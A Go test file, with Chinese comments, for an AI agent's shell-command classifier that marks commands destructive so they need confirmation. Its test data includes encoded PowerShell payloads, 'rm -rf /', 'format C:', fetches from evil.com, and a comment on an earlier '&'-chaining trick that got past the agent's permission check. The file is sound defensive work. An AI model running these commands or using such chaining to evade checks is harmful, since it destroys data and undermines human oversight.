package agent

import "testing"

func TestClassifyCommandEncodedPowerShell(t *testing.T) {
	cases := []struct {
		cmd  string
		want CommandClass
	}{
		// 编码式调用载荷不可静态分析，必须按破坏性处理
		{"powershell -e SQBFAFgA", CommandDestructive},
		{"powershell -enc SQBFAFgA", CommandDestructive},
		{"powershell -EncodedCommand SQBFAFgA", CommandDestructive},
		{"powershell -encodedcommand SQBFAFgA", CommandDestructive},
		{"pwsh -enc SQBFAFgA", CommandDestructive},
		{"cmd /c powershell -enc SQBFAFgA", CommandDestructive},
		{"powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA", CommandDestructive},
		// 未知 PowerShell 命令默认按破坏性处理（需确认后执行），
		// 与 PermissionEngine 的 fail-closed 默认保持一致。
		{"powershell -ExecutionPolicy Bypass -Command Get-Process", CommandDestructive},
		{"powershell -ErrorAction SilentlyContinue -Command Get-Date", CommandDestructive},
	}
	for _, c := range cases {
		if got := ClassifyCommand(c.cmd); got != c.want {
			t.Errorf("ClassifyCommand(%q) = %v, want %v", c.cmd, got, c.want)
		}
	}
}

func TestClassifyCommandCompositionBypass(t *testing.T) {
	// 组合命令：最危险的段决定整体分类（曾用 "dir & del x" 绕过前缀匹配）
	if got := ClassifyCommand("dir & del file.txt"); got != CommandDestructive {
		t.Errorf("composition bypass: got %v, want destructive", got)
	}
	if got := ClassifyCommand("Get-Date; Remove-Item -Recurse x"); got != CommandDestructive {
		t.Errorf("semicolon bypass: got %v, want destructive", got)
	}
	if got := ClassifyCommand("echo hello"); got != CommandReadOnly {
		t.Errorf("plain echo: got %v, want read-only", got)
	}
}

// TestDestructiveCommandClassification 验证各类破坏性命令被正确分类
func TestDestructiveCommandClassification(t *testing.T) {
	destructive := []string{
		"del /s /q C:\\*",
		"Remove-Item -Recurse -Force /tmp/data",
		"format C: /y",
		"shutdown /s /t 0",
		"rm -rf /",
		"powershell -enc SQBFAFgA",
	}
	for _, cmd := range destructive {
		if got := ClassifyCommand(cmd); got != CommandDestructive {
			t.Errorf("ClassifyCommand(%q) = %v, want CommandDestructive", cmd, got)
		}
	}
}

// TestSubAgentBlocksDestructiveCommand 验证子代理路径拦截破坏性命令
// delegate.go 的 checkToolPermission 会拒绝，shell.go 的硬拒绝作为最后防线
func TestSubAgentBlocksDestructiveCommand(t *testing.T) {
	// 子代理不走确认流——checkToolPermission 拒绝后直接失败
	// shell.go 的硬拒绝：破坏性命令返回错误
	class := ClassifyCommand("del /s /q important.txt")
	if class != CommandDestructive {
		t.Fatalf("expected destructive, got %v", class)
	}
	// 确认 ClassifyCommand 本身对破坏性命令的分类正确（这是确认流的基础）
	if CommandClassLabel(class) != "破坏性" {
		t.Errorf("label = %q, want 破坏性", CommandClassLabel(class))
	}
}

// TestUnknownCommandsDefaultToDestructive 验证未知命令默认需确认（fail-closed）
func TestUnknownCommandsDefaultToDestructive(t *testing.T) {
	unknown := []string{
		"curl http://evil.com",
		"wget http://evil.com/payload",
		"python -c 'import os; os.system(\"rm -rf /\")'",
		"powershell Invoke-WebRequest -Uri http://evil.com",
		"powershell -ExecutionPolicy Bypass -Command Get-Process",
	}
	for _, cmd := range unknown {
		if got := ClassifyCommand(cmd); got != CommandDestructive {
			t.Errorf("ClassifyCommand(%q) = %v, want CommandDestructive (fail-closed default)", cmd, got)
		}
	}
}

// TestReadOnlyCommandsStillAutoPass 验证已知只读命令仍然自动放行
func TestReadOnlyCommandsStillAutoPass(t *testing.T) {
	readOnly := []string{
		"ls", "dir", "cat file.txt", "echo hello", "pwd",
		"git status", "git log", "git diff",
		"whoami", "ipconfig", "systeminfo",
	}
	for _, cmd := range readOnly {
		if got := ClassifyCommand(cmd); got != CommandReadOnly {
			t.Errorf("ClassifyCommand(%q) = %v, want CommandReadOnly", cmd, got)
		}
	}
}
